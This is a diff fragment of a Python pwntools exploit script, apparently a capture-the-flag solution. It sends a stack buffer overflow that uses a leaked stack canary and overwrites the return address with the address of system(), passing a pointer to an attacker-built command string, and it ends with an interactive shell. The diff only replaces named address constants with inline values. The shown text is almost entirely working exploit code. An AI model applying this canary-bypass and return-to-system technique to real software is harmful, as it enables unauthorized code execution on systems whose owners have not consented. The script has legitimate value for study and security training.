@@ -31,9 +31,6 @@ def leak_canary():
 #Canary = u32(leak_canary())
 Canary = 0x5268be00
 print "[*] Canary: 0x%x"%Canary
-LUCKYNUMBER = 0x804b098
-system = 0x8048780
-
 payload = [
 	# generate "g> ht- sl" to file "v"
 	'>dir', 
@@ -77,8 +74,8 @@ for cmd in payload:
 	payload = "A"*0x100
 	payload += p32(Canary)
 	payload += "B"*12 
-	payload += p32(system)
+	payload += p32(0x8048780) #system
 	payload += "C"*4
-	payload += p32(LUCKYNUMBER)
+	payload += p32(0x804b098) #luckynumber
 	r.send(payload)
 r.interactive()
